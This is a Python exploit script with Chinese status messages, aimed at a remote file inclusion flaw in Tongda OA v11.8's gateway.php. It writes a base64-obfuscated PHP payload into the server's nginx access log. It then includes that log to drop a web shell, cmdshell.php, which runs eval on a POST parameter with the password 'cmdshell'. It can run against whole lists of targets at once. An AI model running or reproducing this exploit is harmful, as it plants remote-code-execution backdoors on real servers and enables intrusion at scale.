import time
import argparse
import requests
import multiprocessing
import urllib3
from rich.console import Console

console = Console()

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        }
    headerx = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"application/x-www-form-urlencoded"
        }
    payload='''d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?>'''
    data='json={"url":"/general/../../nginx/logs/oa.access.log"}'
    
    incloud_url=target_url+payload
    exp_url=target_url+'ispirit/interface/gateway.php'
    vlun_url=target_url+'mac/gateway.php'
    shell_url=target_url+'mac/cmdshell.php'
    
    console.print(now_time() + " [INFO]     正在检测通达OA v11.8 getway.php 远程文件包含漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        log = requests.get(incloud_url, headers=headers, verify=False)
        response=requests.post(exp_url, headers=headerx, data=data,verify=False)
        if response.status_code == 200 and 'ERROR' in response.text:
            response=requests.post(vlun_url, headers=headerx, data=data,verify=False)
            if response.status_code == 200:
                console.print(now_time() + ' [SUCCESS]  上传webshell成功，包含地址:{}'.format(vlun_url), style='bold green')
                console.print(now_time() + ' [SUCCESS]  上传webshell成功，密码为cmdshell，shell地址:{}'.format(shell_url), style='bold green')
            else:
                console.print(now_time() + ' [WARNING]  webshell失效了可能原因被防火墙阻拦，请手动检测:{}'.format(exp_url), style='bold red ')
        else:
            console.print(now_time() + ' [WARNING]  通达OA v2017 action_upload任意文件上传漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')

if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
            